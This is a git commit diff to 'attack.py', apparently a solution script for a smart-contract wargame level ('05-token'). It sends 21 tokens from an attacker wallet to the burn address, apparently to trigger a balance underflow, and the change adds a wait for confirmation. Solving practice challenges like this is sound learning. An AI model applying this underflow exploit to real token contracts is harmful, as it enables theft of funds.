9157471b51b8b1d6374886539515b4b3d69ed375
Patrice Tisserand <p.tisserand@gmail.com>
2022-03-15 23:34:40 +0100

    token: wait for transaction to be confirmed before checking balance

--- 05-token/token/scripts/attack.py
+++ 05-token/token/scripts/attack.py
@@ -5,5 +5,6 @@ def main(target):
     hacker = accounts.add(config['wallets']['from_key'])
     dead = "0x000000000000000000000000000000000000dead"
     print(f'Balance before: {token.balanceOf(hacker)}')
-    token.transfer(dead, 21, {'from': hacker, 'allow_revert': True})
+    tx = token.transfer(dead, 21, {'from': hacker, 'allow_revert': True})
+    tx.wait(2)
     print(f'Balance after: {token.balanceOf(hacker)}')
